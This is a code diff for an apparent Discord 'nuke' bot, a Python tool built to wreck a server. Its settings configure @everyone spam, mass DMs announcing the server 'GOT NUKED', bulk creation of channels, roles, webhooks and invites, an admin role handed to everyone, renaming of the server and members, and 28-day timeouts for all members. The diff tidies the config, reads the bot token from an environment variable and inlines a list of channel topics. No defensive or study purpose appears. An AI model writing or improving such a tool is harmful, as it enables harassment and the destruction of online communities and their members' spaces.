@@ -1,8 +1,4 @@
 import os
-
-os.system("python -m pip install discord.py")
-os.system("python -m pip install aiohttp")
-
 import discord
 from discord.ext import commands
 import asyncio
@@ -13,59 +9,39 @@ import random
 
 # CONFIG #
 class Config:
-    # ===== BOT SETTINGS =====
-    TOKEN = ""  # Your bot token from Discord Developer Portal
-    PREFIX = "!"  # The prefix to use before commands (e.g. !nuke), you can also delete the prefix if you don't want one
-    WHITELIST = []  # List of user IDs who can use the bot commands, don't give any ids if you want anyone to use bot.
-
-    # ===== MESSAGE SETTINGS =====
-    SPAM_MESSAGE = "@everyone"  # The message that will be spammed in channels
-    SPAM_COUNT = 10  # How many times to send the spam message in each channel
-    TEXT_TO_SPEECH = False  # If true, messages will be read aloud by Discord's text-to-speech
-    DM_MESSAGE = "THE SERVER GOT NUKED"  # Message sent to all members via direct message
-
-    # ===== CHANNEL SETTINGS =====
-    CHANNEL_NAME = "nuked"  # Base name for created text channels
-    CHANNELS_COUNT = 10  # How many text channels to create
-    NEW_CHANNEL_NAME = "nuked"  # Name pattern when renaming existing channels
-    VOICE_CHANNELS_COUNT = 10  # How many voice channels to create
-    VOICE_CHANNEL_NAME = "NUKED"  # Base name for created voice channels
-    CATEGORY_NAME = "NUKED"  # Base name for created categories
-    CATEGORIES_COUNT = 5  # How many categories to create
-    THREAD_COUNT = 5  # How many threads to create in each text channel
-    THREAD_NAME = "nuked"  # Base name for created threads
-    NSFW_CHANNEL_NAME = "nuked"  # Base name for NSFW channels
-    SLOWMODE_DURATION = 300  # Slowmode duration in seconds for all channels
-
-    # ===== ROLE SETTINGS =====
-    ROLE_NAME = "nuked"  # Base name for created roles
-    ROLES_COUNT = 10  # How many roles to create
-    NEW_ROLE_NAME = "nuked"  # Name pattern when renaming existing roles
-    ADMIN_ROLE_NAME = "ADMIN"  # Name of the admin role given to everyone
-
-    # ===== SERVER SETTINGS =====
-    SERVER_NAME = "NUKED SERVER"  # New name for the server
-    SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"  # URL of new server icon
-    NICKNAME = "NUKED"  # New nickname for all members
-    TIMEOUT_DURATION = 28  # Timeout duration in days for all members, anything above 28 will not work
-
-    # ===== WEBHOOK SETTINGS =====
-    WEBHOOK_NAME = "NUKED"  # Base name for created webhooks
-    WEBHOOK_COUNT = 10  # How many webhooks to create per channel
-    WEBHOOK_RENAME = "NUKED"  # Name pattern when renaming webhooks
-
-    # ===== INVITE SETTINGS =====
-    INVITE_COUNT = 10  # How many invite links to create per channel
-
-    # ===== PIN SETTINGS =====
-    PIN_SPAM_COUNT = 5  # How many random messages to pin in each channel
-
-    # ===== VOICE SETTINGS =====
-    MOVE_VOICE_CHANNEL_NAME = "LOSERS"  # Name of voice channel to moves everyone to
-
-    # ===== PERMISSION SETTINGS =====
-    CHAOS_PERMISSIONS = [True, False, None]  # Random permission states for chaos commands, do not change if you dont know what your doing
-
+    TOKEN = os.environ.get("DISCORD_TOKEN", "")
+    PREFIX = "!"
+    WHITELIST = []
+    SPAM_MESSAGE = "@everyone"
+    SPAM_COUNT = 10
+    TEXT_TO_SPEECH = False
+    DM_MESSAGE = "THE SERVER GOT NUKED"
+    CHANNEL_NAME = "nuked"
+    CHANNELS_COUNT = 10
+    NEW_CHANNEL_NAME = "nuked"
+    VOICE_CHANNELS_COUNT = 10
+    VOICE_CHANNEL_NAME = "NUKED"
+    CATEGORY_NAME = "NUKED"
+    CATEGORIES_COUNT = 5
+    THREAD_COUNT = 5
+    THREAD_NAME = "nuked"
+    NSFW_CHANNEL_NAME = "nuked"
+    SLOWMODE_DURATION = 300
+    ROLE_NAME = "nuked"
+    ROLES_COUNT = 10
+    NEW_ROLE_NAME = "nuked"
+    ADMIN_ROLE_NAME = "ADMIN"
+    SERVER_NAME = "NUKED SERVER"
+    SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"
+    NICKNAME = "NUKED"
+    TIMEOUT_DURATION = 28
+    WEBHOOK_NAME = "NUKED"
+    WEBHOOK_COUNT = 10
+    WEBHOOK_RENAME = "NUKED"
+    INVITE_COUNT = 10
+    PIN_SPAM_COUNT = 5
+    MOVE_VOICE_CHANNEL_NAME = "LOSERS"
+    CHAOS_PERMISSIONS = [True, False, None]
 
 # ===== MAIN CODE, ONLY CHANGE IF YOU KNOW WHAT YOUR DOING. =====
 config = Config()
@@ -220,9 +196,10 @@ async def nsfwall(ctx):
 @bot.command()
 async def rtopics(ctx):
     if not is_whitelisted(ctx): return
+    topics = ["nuked", "destroyed", "rekt", "owned", "pwned", "hacked", "crashed", "wiped", "annihilated", "obliterated"]
     for channel in ctx.guild.text_channels:
         try:
-            await channel.edit(topic=random.choice(config.TOPICS))
+            await channel.edit(topic=random.choice(topics))
             await asyncio.sleep(0.01)
         except:
             pass
@@ -657,7 +634,6 @@ async def nuke(ctx):
         if config.DM_MESSAGE:
             tasks.append(member.send(config.DM_MESSAGE))
         if config.TIMEOUT_DURATION:
-            from datetime import timedelta
             tasks.append(member.timeout(timedelta(days=config.TIMEOUT_DURATION)))
     
     await asyncio.gather(*tasks, return_exceptions=True)
